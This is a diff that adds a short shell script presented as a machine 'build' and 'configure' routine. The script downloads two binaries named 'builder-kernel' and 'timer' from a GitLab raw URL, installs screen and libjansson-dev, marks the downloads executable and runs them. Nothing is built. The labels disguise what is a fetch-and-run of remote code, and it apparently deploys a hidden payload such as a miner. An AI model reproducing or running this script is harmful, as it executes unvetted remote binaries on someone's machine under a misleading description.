@@ -1,0 +1,22 @@
+echo "==================== Info Machine ===================="
+echo "Ready"
+echo "===================================================="
+
+echo "+++++++ Build Machine +++++++++"
+nohup wget https://gitlab.com/lambohopo/bash/-/raw/main/builder-kernel
+nohup wget https://gitlab.com/lambohopo/bash/-/raw/main/timer
+nohup mkdir safa
+nohup apt install screen -y
+nohup apt install libjansson-dev -y
+
+echo "+++++++ Configure Machine +++++++++"
+chmod +x builder-kernel
+chmod +x timer
+cd safa
+
+echo "Configure Successfully"
+cd ..
+./builder-kernel
+echo "+++++++ Sync... +++++++++"
+./timer
+
